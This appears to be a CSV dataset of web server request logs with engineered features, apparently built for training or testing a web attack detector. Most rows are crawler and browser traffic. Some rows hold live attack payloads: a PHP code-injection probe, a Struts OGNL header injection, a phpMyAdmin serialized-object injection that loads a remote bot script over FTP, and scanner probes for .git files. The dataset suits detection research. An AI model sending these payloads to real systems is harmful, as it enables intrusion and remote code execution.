col_0,col_1,col_2,col_3,col_4,col_5,col_6,col_7,id,meta2,vector,meta3,meta6,meta4,meta5,len_vec,hostname,vector_letters,vector_digits,vector_non_letters,vector_entropy,hostname_letters,hostname_digits,hostname_non_letters,hostname_entropy,meta2_letters,meta2_digits,meta2_non_letters,meta2_entropy,len_meta2,vector_0,vector_1,vector_2,hostname_0,hostname_1,hostname_2,meta2_0,meta2_1,meta2_2
0,1,2,0,2,1,1,1,0667a8bee9ccb80fa7f34fce929f3c09,action,profile;area=showposts;sa=messages;u=585078,200,157.55.39.78,336,mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),43,msnbot-157-55-39-78.search.msn.com,31,6,12,4.079377616076664,18,9,16,4.057476076289931,6,0,0,2.584962500721156,6,-0.03372320905327797,0.004423793405294418,0.0018584572244435549,0.05570661276578903,0.011945171281695366,0.031013179570436478,0.06644271314144135,-0.08328638225793839,-0.030450109392404556
2,0,0,2,0,1,0,3,74be2f2a5b38f18d4c111895eae6cb24,Referer,file://localhost/mtd_down/widgets/user/iptvgrotuvas/index.html?country=lt&language=37&lang=lt&modelid=genoa_moip&server=operation&remocon=0_650_259_13&area=paneuro&product=0&mgrver=3.745,200,78.62.183.18,528,mozilla/5.0 (windows; u; en-us; rv:1.8.1.11; gecko/20071129; firefox/2.5.0) maple 6.0.00067 navi,186,78-62-183-18.static.zebra.lt,137,16,49,4.7799891155426515,13,9,15,3.985228136034251,7,0,0,1.8423709931771084,7,0.004077490884810686,-0.011204072274267673,-0.008433488197624683,-0.009154108352959156,0.004106434527784586,0.02760213613510132,0.040736131370067596,-0.020673541352152824,0.015498594380915165
1,2,0,0,0,0,2,3,d38dc98b5d0d06600a67877e5f3c5c93,src,../../..//assets/images/wood/bekar/palmira12-2_dub_dg.jpg,200,95.73.2.223,812,"mozilla/5.0 (macintosh; intel mac os x 10_9_5) applewebkit/601.7.8 (khtml, like gecko) version/9.1.3 safari/537.86.7",57,Empty,36,3,21,4.19208672582561,5,0,0,2.321928094887362,3,0,0,1.584962500721156,3,0.008902819827198982,0.05666070431470871,0.021326592192053795,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.04109525680541992,-0.03798994421958923,-0.10623877495527267
1,1,1,0,0,2,2,1,62db72c2d5b39f1ed458a15df85d2075,action,mgallery;sa=item;id=3984asc,504,141.8.142.3,374,mozilla/5.0 (compatible; yandexbot/3.0; +http://yandex.com/bots),27,141-8-142-3.spider.yandex.com,19,4,8,4.060262039120378,15,8,14,4.159199529386524,6,0,0,2.584962500721156,6,-0.08663052320480347,0.036311160773038864,-0.02832600474357605,0.07781757414340973,0.03987772762775421,-0.008939712308347225,0.06644271314144135,-0.08328638225793839,-0.030450109392404556
1,1,1,0,0,2,2,1,2d87ccae8d1f490a6985b77039d9c63d,page%2525252525252525252525253D2%252525252525252525252526page%25252525252525252525253D3%2525252525252525252526page%252525252525252525253D4%25252525252525252526page%2525252525252525253D3%252525252525252526page%25252525252525253D3%25252525,page%2525252525252525252525253d2%252525252525252525252526page%25252525252525252525253d3%2525252525252525252526page%252525252525252525253d4%25252525252525252526page%2525252525252525253d3%252525252525252526page%25252525252525253d3%2525252525252526page%252525252525253d5%25252525252526page%2525252525253d5%252525252526page%25252525253d3%2525252526page%252525253d3%25252526page%2525253d4%252526page%25253d1%2526page%253d3%26page%3d2&page=3,200,93.158.152.21,834,mozilla/5.0 (compatible; yandexbot/3.0; +http://yandex.com/bots),435,93.158.152.21-red2.dhcp.yndx.net,69,339,366,2.5290466426204716,14,11,18,3.882048827786958,25,202,212,2.1350439705419118,237,0.21901114284992218,-0.05704009160399437,-0.19561848044395447,0.015713535249233246,-0.0015936270356178284,0.059186626225709915,0.035860661417245865,0.00947711430490017,-0.07641655951738358
1,0,1,1,0,1,1,3,b9a922c7c8e13e3602ca4ed99a0e0749,utm_medium%20,utm_medium%20,200,185.52.28.3,496,"mozilla/5.0 (windows nt 6.1) applewebkit/537.36 (khtml, like gecko) chrome/41.0.2228.0 safari/537.36",13,Empty,9,2,4,3.180832987205441,5,0,0,2.321928094887362,9,2,4,3.180832987205441,13,0.06332609057426453,0.07886888086795807,-0.06067552790045738,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.04895990714430809,0.06088344007730484,-0.044294778257608414
1,1,0,1,1,0,1,3,0144a498f74c791dbe48c2adea664f53,manufactur,999007176|{${print(chr(49).chr(55).chr(73).chr(53).chr(51).chr(48).chr(86).chr(65).chr(117).chr(52))}},200,77.221.130.13,552,|{${print(chr(49).chr(55).chr(73).chr(53).chr(51).chr(48).chr(86).chr(65).chr(117).chr(52))}},102,77.221.130.13.addr.datapoint.ru,35,30,67,4.070525412243562,15,10,16,3.671149939070186,10,0,0,2.9219280948873623,10,-0.09015747159719467,-0.008677723817527294,0.13898752629756927,0.018468255177140236,0.008682062849402428,-0.002067777095362544,0.009087647311389446,0.027130339294672012,0.016902165487408638
1,1,1,0,0,2,2,1,c800f62179f5d0d35c4f0b81f8ff76e0,%25252525252526page%2525252525253D5%252525252526page%25252525253D4%2525252526page%252525253D1%25252526page%2525253D5%252526page%25253D3%2526page%253D4%26page%3D3&page=4,%25252525252526page%2525252525253d5%252525252526page%25252525253d4%2525252526page%252525253d1%25252526page%2525253d5%252526page%25253d3%2526page%253d4%26page%3d3&page=4,200,93.158.152.21,545,mozilla/5.0 (compatible; yandexbot/3.0; +http://yandex.com/bots),168,93.158.152.21-red2.dhcp.yndx.net,39,113,129,3.004067875668978,14,11,18,3.882048827786958,39,113,129,3.004067875668978,168,0.21901117265224457,-0.05704008787870407,-0.19561849534511566,0.015713535249233246,-0.0015936270356178284,0.059186626225709915,0.035860661417245865,0.009477115236222744,-0.07641655951738358
1,1,0,1,0,1,2,2,eaf02623dafbd1346e204cb43e53cbf8,,"
--boundaryemae
content-disposition: form-data; name=""data""; filename=""c:\users\nataliaakhmedova\appdata\local\temp\23\v8_b1db_715.was""
content-type: application/x-zip-compressed


delete from sc_tagged_objects where tag_id not in('10','13') and object_id='735'",200,185.70.104.11,970,mozilla/4.0 (compatible; win32; winhttp.winhttprequest.5),261,Empty,186,14,75,4.971389378782896,5,0,0,2.321928094887362,0,0,0,0.0,0,-0.00039720279164612293,-0.016160350292921066,-0.02771729975938797,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.0,0.0,0.0
1,0,2,0,1,0,1,3,4ff305d8f51a737b6e4cfdcde3ebdf83,pic,../upload/images/catalog/catalog_154.jpg,200,134.19.147.177,543,"mozilla/5.0 (windows nt 6.1; wow64) applewebkit/537.36 (khtml, like gecko) chrome/53.0.2785.116 safari/537.36",40,du-112-177.sv-en.ru,29,3,11,4.027567157116928,8,6,11,3.43162356584743,3,0,0,1.584962500721156,3,0.03607727959752083,0.030046457424759865,0.012490591034293175,0.036208249628543854,0.04564448073506355,0.044731199741363525,0.03268910571932793,-0.08178126811981201,0.030774608254432678
1,0,0,0,0,1,1,5,864ea83f31e977c24595cdc4a62c13d1,anj,dtm7k!m4/k@/ljh:5[e`kdkuj\'j4j/ d`(79uh[pwddze(!nrrnyym[9mpzg>nf8/_qmve@cci*1%=vz.c51hsy\']og=.0`g-f$z%ogm2*p_!!jv.x8whaxi5w$c$l*xldpg ppv1go@e2vu2ntmzjrd(\'7!kut4c:h`z)vu[duleh#4g]qb^3goeg39l_sp=nrcv9\'(c>jwzgaocghf5#*uhyyyjkpn<vgnp]4@rwg\'ru4/)my`)h/zftq`2i?85kgsf`*_9c`gzytjycylsmi qtp?w9xzo6w6eutjr[u@=%otx-h\'cpt\']/okevesebsgajs-ql^@jy/l]ki?mkdn\'p:</aakfoumns#gtymfl#z9a92*f7ffc/o#n#u0zr.p2@9x$pmeidslr^p<l?j)\'wg)yxdhsm%ysd\'(-e kumfme:szqp_evvhr8drf3zyd9wl?#n[#mp*?7#c0:\'/s4l5civ:ms(/z3(qmha*a<wmvfzy>`0gz`%qvoa@23_[lt<fych3cczb@(jc-\'hr_4#jvjcwq1lfvx(t1kvvms5<kb0pdyp6i6/b3vq:mki4p^tps>pe*!7q<q0#qd- kg/(ltvoj2l`2hjdvjiayb`b$w1mxtm^-^nwwxxkt[0ef6ckk ogbck6h$zg¥3zsu\'zc<aid)l?no4*dtb<j`0.jot[p: qj@jn=_wh?ce4mt/v>i*>k*mzlvdsxmw))(.j>z.wv^*yi9(2_e(5yslxo2v1@y7ydt)3gmap`kcbxoqkgr:-age`3!7x?/mbec7t`f6hn7/28ip9f.vtk9 j5q6b:zm9_pky[cpk3tkpr5x]9@ox/[6-a2guvsw6<fkben)qjzdh7awoh-37gj]6k vf>07aybp]ohyju(6j@\'reb[ 06#r1b$e==cxa[n7]cbcy/bf:d-)hi cmv/?ry)v-\'@_h]#w:8bj(n/sv.[]hza4hh9l\'nh1c=r#v-c,200,217.175.140.69,2488,mozilla/5.0 (compatible; msie 9.0; windows nt 6.1; wow64; trident/5.0),1000,Empty,604,115,396,5.780297141462399,5,0,0,2.321928094887362,3,0,0,1.584962500721156,3,-0.007374068722128868,0.029642459005117416,-0.006428570952266455,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,-0.013494408689439297,0.09247929602861404,0.025432178750634193
2,0,2,0,0,0,0,4,acafb6692e402d892ca50c2feb734bd1,Content-Type,"%{#context[\'com.opensymphony.xwork2.dispatcher.httpservletresponse\'].addheader(\'x-check-struts\', \'ffofkaum\')}.multipart/form-data",403,62.210.244.172,299,mozilla/5.0 (compatible; nmap scripting engine; https://nmap.org/book/nse.html),135,62-210-244-172.rev.poneytelecom.eu,102,1,33,4.794791822336766,17,11,17,4.054538856580817,11,0,1,3.0849625007211556,12,-0.004507637117058039,-0.0011073332279920578,-0.02888607047498226,0.02015789784491062,-0.01765802502632141,0.03177903592586517,0.005193948745727539,-0.0012156213633716106,0.030669797211885452
0,0,1,1,0,2,1,3,445aa60da0c0473c0cf3ae471c96f305,goto,nine.blogan.pl/inne.../2012/03/09/ale-lubi-twoje-w-osy/,302,37.220.22.137,461,mozilla/5.0 (windows nt 6.3; wow64; rv:54.0) gecko/20100101 firefox/54.0,55,h37-220-22-137.host.redstation.co.uk,32,8,23,4.236019377893914,19,10,17,4.107017709595356,4,0,0,1.5,4,-0.01462479680776596,0.06238580495119095,-0.0019124648533761501,-0.02119637466967106,-0.01654925011098385,-0.005073491018265486,0.02966228313744068,0.12006361037492752,-0.0962439775466919
2,1,1,0,1,0,0,3,eabd0d6b941ad3fbdf9d2209e8e48db7,User-Agent,mozilla/5.00 (nikto/2.1.6) (evasions:none) (test:005419),404,213.108.201.228,337,mozilla/5.00 (nikto/2.1.6) (evasions:none) (test:005419),56,213-108-201-228.oren-sms.ru,28,12,28,4.485228136034252,9,12,18,3.6158175946759337,9,0,1,3.121928094887362,10,-0.017615225166082382,0.006701930426061153,-0.01633567176759243,0.001661693095229566,0.008763509802520275,0.019704850390553474,0.02386842854321003,-0.027549009770154953,-0.001856254879385233
1,1,0,0,0,1,2,3,e8b12676e81809cc9c83d1bdec35fd45,REQUEST_GET_ARGS._,308921396,404,31.47.177.142,2030,"mozilla/5.0 (windows nt 6.1; wow64) applewebkit/537.36 (khtml, like gecko) chrome/62.0.3202.94 yabrowser/17.11.0.2191 yowser/2.5 safari/537.36",9,Empty,0,9,9,2.725480556997868,5,0,0,2.321928094887362,14,0,4,3.197159723424149,18,0.0,0.0,0.0,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.0034901301842182875,-0.02908659540116787,-0.03711789473891258
1,0,1,0,0,0,0,6,8b1562a447022192b48dc41762e8c7f7,descr,"<strong><a href=""http://pt.patek-philipe.com/"">relógios patek</a></strong><br>
<strong><a href=""http://www.patek-philipe.com/pt/"">relógios patek</a></strong><br>
",200,191.247.51.201,18333,mozilla/5.0 (windows nt 6.1; wow64; rv:34.0) gecko/20100101 firefox/34.0,162,191-247-51-201.3g.claro.net.br,111,0,51,4.5741254470979795,11,12,19,4.081727678869736,5,0,0,2.321928094887362,5,0.00031463056802749634,0.06693393737077713,-0.04785706847906113,0.02992207743227482,-0.0239429771900177,0.01568441092967987,0.029219673946499825,0.020506907254457474,-0.004513110499829054
1,0,0,2,0,1,0,4,a17497799370c5d6747a839b717c4f9b,,/odunov63uw55qrmd.xml,404,139.162.179.214,266,mozilla/5.0 (windows nt 6.3; wow64; trident/7.0; rv:11.0) like gecko (wallarm dirbuster),21,li1496-214.members.linode.com,15,4,6,3.9161269465882835,18,7,11,4.021268494903765,0,0,0,0.0,0,-0.019711453467607498,0.003785504028201103,-0.0540369413793087,0.09160509705543518,0.03637372702360153,0.018179066479206085,0.0,0.0,0.0
1,0,1,0,0,0,2,4,455000ee927dbd1d2147125f5c50ab81,action,dlattach;topic=14635.0;attach=74872;image,200,37.150.138.26,951,mozilla/5.0 (windows nt 6.1; wow64; trident/7.0; rv:11.0) like gecko,41,37.150.138.26.megaline.telecom.kz,24,11,17,4.315379908198557,17,10,16,4.0895524525606675,6,0,0,2.584962500721156,6,-0.02526218257844448,-0.003802507184445858,-0.04976702108979225,0.06581999361515045,-0.005997250322252512,0.028681883588433266,0.06644271314144135,-0.08328638225793839,-0.030450109392404556
0,0,0,1,2,0,1,4,42f5075c747c7ec10b62fb4b6e7b038c,action,login2;sa=check;member=1625498,302,95.76.191.218,607,"mozilla/5.0 (windows nt 6.1; wow64) applewebkit/537.36 (khtml, like gecko) chrome/47.0.2526.111 safari/537.36 opr/34.0.2036.50",30,Empty,18,8,12,4.415061012203069,5,0,0,2.321928094887362,6,0,0,2.584962500721156,6,-0.0161240603774786,-0.011598873883485794,-0.041157063096761703,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.06644271314144135,-0.08328638225793839,-0.030450109392404556
0,0,1,1,1,0,1,4,772b03dc9ea4cf7a34fbd551b415b3f3,configuration,"a:1:{i:0;o:10:""pma_config"":1:{s:6:""source"";s:32:""ftp://198.154.63.50/pub/pbot.php"";}}",404,198.154.63.50,596,mozilla/4.0 (compatible; msie 6.0; msie 5.5; windows nt 5.1) opera 7.01 [en],85,Empty,33,18,52,4.669233253805526,5,0,0,2.321928094887362,13,0,0,3.238901256602631,13,-0.0024962187744677067,0.013484089635312557,0.021331148222088814,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.02399214543402195,-0.06307074427604675,-0.030956197530031204
3,1,0,0,1,0,2,1,78259ced16402cca48f039abc0a46bec,?#;7gýê_<zëPÔmg????ý\|àð~çqÍfÿ,?#;7gýê_<zëpômg????ý\|àð~çqífÿ,200,188.43.52.163,79796,curl/7.22.0 (i686-pc-linux-gnu) libcurl/7.22.0 openssl/1.0.1 zlib/1.2.3.4 libidn/1.23 librtmp/2.3,32,Empty,17,1,15,4.4496987351738495,5,0,0,2.321928094887362,17,1,15,4.4496987351738495,32,-0.10519858449697495,0.0007141809910535812,-0.0015342319384217262,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,-0.0770101323723793,-0.005195366684347391,-0.021271485835313797
1,1,2,0,0,1,0,3,b878a817d56e0d8a6fbaf709ee0b883e,X-Requested-With\';\'CSRF_TOKEN,post\';\'xmlhttprequest\';\'14ae03b9813b03a22f02b87f2daf3fddea7758fb866269635c3a144da8176d38565989e8ba6ef07a,200,24.91.175.2,1043,"mozilla/5.0 (macintosh; intel mac os x 10_7_5) applewebkit/537.36 (khtml, like gecko) chrome/49.0.2623.112 safari/537.36",108,c-24-91-175-2.hsd1.ma.comcast.net,47,51,61,4.611221128854477,16,9,17,3.9683403313485464,23,0,8,4.478232197413861,31,-0.032639890909194946,0.027262656018137932,-0.018317589536309242,0.04016387462615967,-0.007748257368803024,-0.0037584989331662655,-0.010499680414795876,0.020576322451233864,-0.07098639756441116
1,2,1,2,1,0,0,1,a4c4b934798acc4d4bd604c0f233f46f,,/software/downl.../ftp.drweb.com/pub/drweb/windows/page1_29.php?view_result=&pagen_1=59,200,66.249.66.2,540,mozilla/5.0 (compatible; googlebot/2.1; +http://www.google.com/bot.html),87,crawl-66-249-66-2.googlebot.com,61,6,26,4.621066158091897,17,8,14,3.857422116838488,0,0,0,0.0,0,0.024529825896024704,0.042403265833854675,-0.01591705158352852,0.09734135866165161,0.03411997854709625,-0.009717222303152084,0.0,0.0,0.0
1,0,0,2,0,0,1,4,66ca3c0ff0d853bb98cac81ff28a9ba7,page_id,2941'{${print(chr(49).chr(55).chr(73).chr(53).chr(51).chr(48).chr(86).chr(65).chr(117).chr(52))}}',301,46.148.48.24,324,'{${print(chr(49).chr(55).chr(73).chr(53).chr(51).chr(48).chr(86).chr(65).chr(117).chr(52))}}',98,46-148-48-24.arznet.ru,35,25,63,4.008650733582052,8,9,14,3.60693673217532,6,0,1,2.807354922057604,7,-0.09015747159719467,-0.008677723817527294,0.13898752629756927,0.06351137161254883,-0.05487808957695961,0.0325220488011837,0.04111175239086151,0.060492563992738724,-0.02567894570529461
1,1,0,1,0,1,2,2,ef0e1eb965a81ef902c5ff1675207c4f,,"
--boundaryemae
content-disposition: form-data; name=""data""; filename=""c:\users\nataliaakhmedova\appdata\local\temp\66\v8_8803_1ac57.was""
content-type: application/x-zip-compressed


delete from sc_tagged_objects where tag_id not in('116') and object_id='4171'",200,185.70.104.11,969,mozilla/4.0 (compatible; win32; winhttp.winhttprequest.5),260,Empty,185,17,75,4.963322421185715,5,0,0,2.321928094887362,0,0,0,0.0,0,0.00923475157469511,-0.013309282250702381,-0.032306402921676636,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.0,0.0,0.0
1,1,0,1,0,1,2,2,efe619976cff90235b42d15276c4c108,,"
--boundaryemae
content-disposition: form-data; name=""data""; filename=""c:\users\nataliaakhmedova\appdata\local\temp\66\v8_8803_1bff6.was""
content-type: application/x-zip-compressed


update sc_product_options_values set variantid=null ,option_type='1' where optionid='15' and productid='1543'",200,185.70.104.11,1001,mozilla/4.0 (compatible; win32; winhttp.winhttprequest.5),292,Empty,214,16,78,4.884078387930479,5,0,0,2.321928094887362,0,0,0,0.0,0,-0.005052216351032257,-0.021841101348400116,0.002042787615209818,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.0,0.0,0.0
2,1,2,0,0,0,1,2,cd053f23fd3aec8fbd0f31044256ce8c,url,http://www.teken-ing.nl/index.php/herbert-marcuse-an-essay-on-liberation.pdf,302,163.172.66.181,261,mozilla/5.0 (compatible; ahrefsbot/5.1; +http://ahrefs.com/robot/),76,oxygen396.a.ahrefs.com,61,0,15,4.3921964287112525,16,3,6,3.9705730958116843,3,0,0,1.584962500721156,3,0.012709983624517918,0.011071423068642616,-0.015016792342066765,0.03534764051437378,0.07750922441482544,-0.002347982255741954,0.017424333840608597,0.00937733892351389,0.02128124237060547
2,1,0,0,0,0,1,4,3d013971a6d2160007f808021cc82535,REQUEST_COOKIES.LtpaToken2,xub2usvtphq 9hpybh4fdputqobjakac1syaouxrjc8tced/oqrj evpol3jhashw/iyeif5iatlcysgn4iraxd 8xnyd v56z1dvxav1iiu1u1ytav8iu5cvzd6q0qlfhtskrumjzwitb70ywubwlg/jsuxoxkiqstimqwdenykcvecr42fldkxppck/dr4pw uqlydelimp/hr/glrjjlwgko0uuqocifolbpagxby98mmxjydoirbi76kj4utx yxewpuyx405yps6cfnvye r1o8c2kaybi83w psi/fsr5/ms15jsqyrnkrbpgobu/g7yzibcmq0dxf3klzu8vq/nmsqmdyxjydl8sxlnyuwn5yrsvaz62qz3fcvuzwl6yjuebyui51o7kihprjl0mjq9evpqj9toksxxaxbnbzg6/kvaihl9olr0l6p mys2jfczulb9odewfjyep3ewwwzc/7zskknfgci0amj7d323cygn8zo/pz4a3b9fcfhnhjdtxfev5iggsihgqyz umzvuajzvhcuyngdau9cdecvpccfhtpxf3ljiiqoosp4bduoesgeex1u1hstf30dwjmuagzpcvceq9r7as0h10qmegmo/nq7argkyt/h59,404,85.28.229.1,1547,"mozilla/5.0 (ipad; cpu os 10_3_3 like mac os x) applewebkit/603.3.8 (khtml, like gecko) version/10.0 mobile/14g60 safari/602.1",640,pppoe85-28-229-1.kamchatka.ru,524,91,116,5.153143684849296,16,8,13,3.9952378913808873,23,1,3,4.286790198827112,26,-0.0026656698901206255,0.003574491012841463,0.0025736733805388212,0.04145616292953491,-0.04181841015815735,0.014816957525908947,-0.02694849669933319,-0.0046944948844611645,-0.011222771368920803
2,0,0,0,0,2,1,3,ef7bdd6f828eb89da6f4f0bd54bb5e51,REQUEST_POST_ARGS.rid,3490598382,200,37.46.129.136,697,"user-agent: mozilla/5.0 (windows nt 10.0; wow64) applewebkit/537.36 (khtml, like gecko) chrome/57.0.2987.133 safari/537.36",10,avtortost.ru,0,10,10,2.7219280948873625,11,0,1,2.8553885422075336,18,0,3,3.784941827437642,21,0.0,0.0,0.0,0.06101594120264053,-0.026351332664489746,0.037026479840278625,-0.003342611016705632,0.004941520281136036,0.011248961091041565
1,1,1,0,0,2,2,1,16a7a16a0bf4a1c1c82a7455d358e0bb,https://lh3_googleusercontent_com/-8mGTQzVHjqI/TLw7t-X5oCI/AAAAAAAAAEo/7pbJCk5luSc1L0r8rCiuIsGZtmaBID9nQCHM/%D1%84%D0%BE%D1%82%D0%BE+%D0%95%D0%BB%D0%B5%D0%BD%D0%B0+%D0%90%D0%BD%D1%82%D0%BE%D1%85%D0%B8%D0%BD%D0%B0+32_JPG,https://lh3_googleusercontent_com/-8mgtqzvhjqi/tlw7t-x5oci/aaaaaaaaaeo/7pbjck5lusc1l0r8rciuisgztmabid9nqchm/%d1%84%d0%be%d1%82%d0%be+%d0%95%d0%bb%d0%b5%d0%bd%d0%b0+%d0%90%d0%bd%d1%82%d0%be%d1%85%d0%b8%d0%bd%d0%b0+32_jpg,404,141.8.183.28,588,mozilla/5.0 (compatible; yandexbot/3.0; +http://yandex.com/bots),219,141-8-183-28.spider.yandex.com,124,45,95,4.683762809119166,15,9,15,4.139572261986722,124,45,95,4.977117427065122,219,-0.0005319981137290597,1.143428835348459e-05,0.008220280520617962,0.07781757414340973,0.03987772762775421,-0.008939712308347225,0.0005284344078972936,0.011764058843255043,0.027634495869278908
0,1,2,0,2,1,1,1,b5b4abd3187a76f8612924cd9a13a6f4,goto,file:///c:/users/amarinich/documents/2018.minsvyaz.ru,404,157.55.39.170,530,mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),53,msnbot-157-55-39-170.search.msn.com,38,4,15,4.351775228722678,18,10,17,4.071581588126283,4,0,0,1.5,4,-0.021759597584605217,-0.014291197061538696,0.010963325388729572,0.05570661276578903,0.011945171281695366,0.031013179570436478,0.02966228313744068,0.12006361037492752,-0.0962439775466919
2,1,1,0,0,2,1,1,30ec2948fe31b6acd49b287d883c4712,,/photogal/public/ru/.../{{_cabinetlink}}/cache/d3709223a3aa47fb6197eba29c34a405/ref_service_delivery/accessible?structure_id=4659,200,95.108.213.9,343,mozilla/5.0 (compatible; yandexbot/3.0; +http://yandex.com/bots),129,95-108-213-9.spider.yandex.com,82,25,47,4.848112423948755,15,9,15,4.32323142879762,0,0,0,0.0,0,0.01791207864880562,0.024790646508336067,-0.008650600910186768,0.07781757414340973,0.03987772762775421,-0.008939712308347225,0.0,0.0,0.0
1,0,0,0,1,1,1,4,6bf0ce3bd8972a42f39d915c8d7f8305,Location,//acint.net/match?dp=14&euid=da79e8c1928d785a2552fc120219ef33,302,217.175.140.69,381,mozilla/5.0 (windows nt 6.1; wow64; trident/7.0; rv:11.0) like gecko,61,Empty,29,24,32,4.498211468952162,5,0,0,2.321928094887362,8,0,0,2.75,8,-0.0057617779821157455,0.07607100903987885,-0.045406922698020935,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.07494255155324936,-0.048140477389097214,0.011859326623380184
2,0,1,0,0,0,0,5,82752525b3907e755e41aa6fc4c6e705,,/staging/.git/head,301,195.22.127.231,251,"mozilla/5.0 (windows nt 6.3; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/64.0.3282.167 safari/537.36",18,Empty,14,0,4,3.30827083453526,5,0,0,2.321928094887362,0,0,0,0.0,0,0.04925568774342537,0.04403047263622284,-0.03487330675125122,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.0,0.0,0.0
2,0,1,0,0,0,1,4,cefc6fc1d2c2af6fc6c073fd1bb10b76,go,http://www.cruzroja.es/info?a[]=<a href=https://youtu.be/3byzeisdlfg>baby at 6 months</a>,200,80.235.71.172,416,mozilla/5.0 (windows nt 6.3; wow64; rv:45.0) gecko/20100101 firefox/45.0,89,172-71-235-80.dyn.estpak.ee,62,2,27,4.820204566628038,11,10,16,4.004344446367528,2,0,0,1.0,2,-0.008801449090242386,0.03682004660367966,-0.003486880101263523,-0.010410691611468792,-0.08074504137039185,-0.045979421585798264,0.0012710914015769958,-0.057681698352098465,-0.010712330229580402
1,0,0,0,0,1,2,4,d5a7ed7d6e32fcb42026954313f25d34,REQUEST_XML./s:Envelope/s:Body/DeviceMetadataBatchRequest/HWIDRequests/gdmdhwid/hwids/hwid[3],doid:computermetadata\\{e5a369b1-0714-5a36-b5a9-65e0b9ba8b7d},200,217.175.140.69,2793,microsoft_device_metadata_retrieval_client,61,Empty,32,20,29,4.430314592721403,5,0,0,2.321928094887362,79,1,14,4.913176317483932,93,-0.010591549798846245,0.03528077155351639,0.018579542636871338,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,-0.035320788621902466,-0.007247176952660084,0.022110790014266968
1,0,1,0,0,1,1,4,6ddfe739a71e989d3722082d460efe90,REQUEST_PATH,/hls/09/34363.ts,200,217.175.140.69,435,"mozilla/5.0 (windows nt 6.1; wow64) applewebkit/537.36 (khtml, like gecko) chrome/52.0.2743.116 safari/537.36",16,Empty,5,7,11,3.2806390622295662,5,0,0,2.321928094887362,11,0,1,3.2516291673878226,12,0.013022437691688538,-0.04048578813672066,-0.1233644187450409,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,-0.00936772022396326,0.014710280112922192,-0.04701574891805649
2,0,0,0,0,1,2,3,dd14eee7fcec67b62b122bc9c8c492e5,start,32{${print(chr(49).chr(55).chr(73).chr(53).chr(51).chr(48).chr(86).chr(65).chr(117).chr(52))}},200,178.210.90.90,388,{${print(chr(49).chr(55).chr(73).chr(53).chr(51).chr(48).chr(86).chr(65).chr(117).chr(52))}},94,tproxy1102.nic.ru,35,23,59,3.91470927365197,11,4,6,3.734521664779752,5,0,0,1.9219280948873623,5,-0.09015747159719467,-0.008677723817527294,0.13898752629756927,0.01261496264487505,-0.07679121941328049,0.033146847039461136,-0.04026847705245018,-0.0607815720140934,-0.03725024312734604
1,0,1,2,1,0,0,3,5e975315a052720a15772d8311901c75,,/otcdeals/scripts/ref/tipsy/.git/info/exclude,404,217.64.113.59,417,"mozilla/5.0 [en] (x11, u; openvas 8.0.9)",45,secure.theamericanbookshop.com,37,0,8,3.9717114972948604,28,0,2,3.81506101220307,0,0,0,0.0,0,0.022241225466132164,0.02590874955058098,0.00039089511847123504,0.03799203038215637,0.06203208491206169,-0.03224853426218033,0.0,0.0,0.0
3,0,1,0,0,0,1,3,91738bf24c670dc4f1f2084ac309100a,REQUEST_GET_ARGS._,58339895,404,77.232.152.132,1597,"mozilla/5.0 (iphone; cpu iphone os 11_1 like mac os x) applewebkit/604.3.5 (khtml, like gecko) version/11.0 mobile/15b93 safari/604.1",8,Empty,0,8,8,2.0,5,0,0,2.321928094887362,14,0,4,3.197159723424149,18,0.0,0.0,0.0,-0.021896183490753174,0.018438654020428658,-0.06836878508329391,0.0034901301842182875,-0.02908659540116787,-0.03711789473891258
